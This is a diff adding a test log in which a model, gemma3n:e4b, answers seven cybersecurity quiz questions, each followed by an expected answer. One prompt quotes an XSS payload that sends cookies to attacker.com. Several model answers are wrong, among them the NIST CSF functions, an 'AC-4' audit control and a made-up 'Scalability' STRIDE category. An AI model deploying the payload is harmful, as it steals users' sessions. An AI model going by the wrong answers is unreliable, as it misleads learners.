@@ -1,0 +1,169 @@
+Cybersecurity Sanity Test Log
+Run Mode: gemma3n_e4b
+Initialized: 2025-07-15T23:00:10.540131
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-07-15T23:00:25.118496
+Model: gemma3n:e4b
+Category: Basic Definitions - Identification
+Response Time: 14.57 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+Analyze the following statement: 'The system must enforce multi-factor authentication (MFA) for all administrative access.' In the context of cybersecurity, what type of statement is this and what is its primary purpose?
+
+LLM RESPONSE:
+This is a **security requirement statement**. Its primary purpose is to **enhance system security by requiring multiple verification factors for administrative accounts, reducing the risk of unauthorized access and account compromise.** It aims to protect against threats like stolen passwords and phishing attacks.
+
+EXPECTED SHORT ANSWER:
+This statement is a security requirement. Its purpose is to define a specific functionality or constraint (MFA) to protect critical access.
+
+--- End of Test Case ---
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-07-15T23:00:45.924778
+Model: gemma3n:e4b
+Category: Frameworks - Application
+Response Time: 20.80 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+A company experiences a ransomware attack. They activate their incident response plan to contain the damage and begin restoring systems from backups. According to the NIST Cybersecurity Framework (CSF), which two core functions are most prominently demonstrated by these actions?
+
+LLM RESPONSE:
+According to the NIST Cybersecurity Framework (CSF), the two core functions most prominently demonstrated by the actions you described are:
+
+*   **Protect:** Containing the damage and restoring systems from backups directly addresses protecting the organization's assets (data, systems, etc.) from harm.
+*   **Recover:** Restoring systems from backups is a key recovery activity, aiming to restore business operations after a disruptive incident like ransomware.
+
+EXPECTED SHORT ANSWER:
+The primary functions demonstrated are 'Respond' (activating the incident plan) and 'Recover' (restoring from backups).
+
+--- End of Test Case ---
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-07-15T23:00:57.381745
+Model: gemma3n:e4b
+Category: Security Controls - Identification
+Response Time: 11.45 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+A security policy mandates that 'all actions performed by privileged users, including logins and system changes, must be recorded in immutable, time-stamped log files.' Within the NIST SP 800-53 standard, which control family specifically addresses this type of requirement?
+
+LLM RESPONSE:
+The control family in NIST SP 800-53 that specifically addresses the requirement for recording privileged user actions in immutable, time-stamped log files is **AC - Access Control**. Specifically, **AC-4 (Audit Events)** within that family.
+
+EXPECTED SHORT ANSWER:
+This requirement is addressed by the 'AU' (Audit and Accountability) control family.
+
+--- End of Test Case ---
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-07-15T23:01:07.937504
+Model: gemma3n:e4b
+Category: Vulnerabilities - Identification
+Response Time: 10.55 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+A web application has a comments section where user input is directly rendered back to the page without being sanitized. An attacker posts a comment containing '<script>document.location="http://attacker.com/steal?cookie="+document.cookie</script>'. What is the common name for this vulnerability and what is its corresponding CWE identifier?
+
+LLM RESPONSE:
+The common name for this vulnerability is **Cross-Site Scripting (XSS)**. 
+
+Its corresponding CWE identifier is **CWE-79**.
+
+EXPECTED SHORT ANSWER:
+This vulnerability is known as Cross-Site Scripting (XSS). Its corresponding identifier is CWE-79.
+
+--- End of Test Case ---
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-07-15T23:01:17.985343
+Model: gemma3n:e4b
+Category: Threat Modeling - Classification
+Response Time: 10.05 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+During a threat modeling exercise, a team identifies a risk where an unauthorized user could intercept and alter data packets being sent between a client and a server, changing the amount of a financial transaction. Within the STRIDE threat model, which category does this threat belong to?
+
+LLM RESPONSE:
+This threat falls under the **Scalability** category of the STRIDE threat model. Specifically, it relates to **Data Integrity**, as the attacker is altering the data being transmitted.
+
+EXPECTED SHORT ANSWER:
+This threat belongs to the 'Tampering' category of the STRIDE model, as it involves the unauthorized modification of data.
+
+--- End of Test Case ---
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-07-15T23:01:31.000930
+Model: gemma3n:e4b
+Category: Regulations/Directives - Application
+Response Time: 13.01 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+Consider two security incidents in the EU: 1) A nationwide power grid operator suffers a cyberattack that disrupts electricity distribution. 2) A social media company has a data breach exposing the personal messages of millions of users. Which regulation is the primary concern for incident 1, and which for incident 2?
+
+LLM RESPONSE:
+For incident 1 (power grid disruption), the primary concern is the **NIS Directive (Network and Information Security Directive)**. 
+
+For incident 2 (data breach exposing personal messages), the primary concern is the **GDPR (General Data Protection Regulation)**.
+
+EXPECTED SHORT ANSWER:
+Incident 1 (disruption of critical infrastructure) is primarily a concern for the NIS 2 Directive. Incident 2 (breach of personal data) is a primary concern for GDPR.
+
+--- End of Test Case ---
+==================================================
+
+--- Test Case Start ---
+Timestamp: 2025-07-15T23:01:39.672692
+Model: gemma3n:e4b
+Category: Basic Principles - Application
+Response Time: 8.67 seconds
+
+SYSTEM PROMPT:
+You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.
+
+USER PROMPT:
+A cloud storage service uses data checksums (like SHA-256 hashes) to verify that files have not been altered or corrupted during upload or download. Which principle of the CIA triad is primarily being upheld by this security control?
+
+LLM RESPONSE:
+**Integrity** is the principle of the CIA triad primarily upheld by using data checksums. Checksums ensure data hasn't been altered or corrupted.
+
+EXPECTED SHORT ANSWER:
+This control primarily upholds the principle of 'Integrity'.
+
+--- End of Test Case ---
+==================================================
+
+--- Run Summary ---
+
+Model: gemma3n:e4b
+  - Total Tests: 7
+  - Total Time Spent in LLM Calls: 89.10 seconds
+  - Average Response Time: 12.73 seconds
+
+Total Number of Test Cases Configured: 7
+
+End of Log.
